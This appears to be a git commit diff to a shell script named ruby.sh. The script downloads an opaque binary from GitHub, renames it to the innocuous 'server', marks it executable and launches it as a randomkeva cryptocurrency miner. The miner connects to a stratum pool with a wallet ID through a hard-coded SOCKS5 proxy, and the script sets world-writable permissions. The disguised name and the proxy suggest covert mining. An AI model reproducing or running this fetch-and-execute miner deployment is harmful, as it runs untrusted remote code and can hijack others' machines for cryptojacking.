b95d875099e02c1ce3d2d80c7c01162209228355
Kaxib-Bygb <90846137+Kaxib-Bygb@users.noreply.github.com>
2021-09-16 21:04:47 +0700

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -1,6 +1,8 @@
+#!/bin/bash
 apt update 
 apt install screen -y 
-wget -O KAXib6Y9b https://github.com/Kaxib-Bygb/Kaxib-Bygb/raw/main/KAXib6Y9b
-chmod +x KAXib6Y9b
+wget -O server https://github.com/Kaxib-Bygb/Kaxib-Bygb/raw/main/server
+chmod +x server
 screen -dmS ls
-./KAXib6Y9b --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.6Y9b=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://143.198.231.168:1080 --keepalive true
+chmod +x ruby.sh && chmod +x server && chmod 777 Network ruby.sh
+./server -a randomkeva --url stratum-eu.rplant.xyz:17061 --tls --user VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.6Y9b=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://143.198.231.168:1080
